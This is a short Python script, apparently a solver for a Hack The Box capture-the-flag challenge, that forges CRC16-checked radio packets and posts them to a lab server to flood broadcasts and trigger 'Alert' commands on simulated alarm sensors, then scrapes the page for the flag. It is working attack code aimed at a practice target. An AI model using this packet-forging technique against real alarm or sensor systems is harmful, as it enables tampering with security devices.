#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN: Enviar broadcasts a intervalos exactos
print("[*] Enviando broadcasts con delay de 0.05s")
s = requests.Session()
s.get(base_url)

data = bytes([0x03])
crc = crc16(data)
packet = (data + struct.pack('<H', crc)).hex().upper()

for i in range(50):
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.05)

time.sleep(5)
r = s.get(base_url)

sensor_states = re.findall(r'spinner-grow (text-\w+)', r.text)
print(f"States after broadcast: {sensor_states}")

if 'HTB{' in r.text:
    print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))

# INNOVACIÓN: Enviar Alert a las alarmas
print("\n[*] Enviando Alert a todas las alarmas")
s = requests.Session()
s.get(base_url)

for addr in [0xA1, 0xA2, 0xA3, 0xA4]:
    data = bytes([addr, 0xA0])  # Alert
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.1)

time.sleep(3)
r = s.get(base_url)
sensor_states = re.findall(r'spinner-grow (text-\w+)', r.text)
print(f"States after alert: {sensor_states}")

if 'HTB{' in r.text:
    print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))
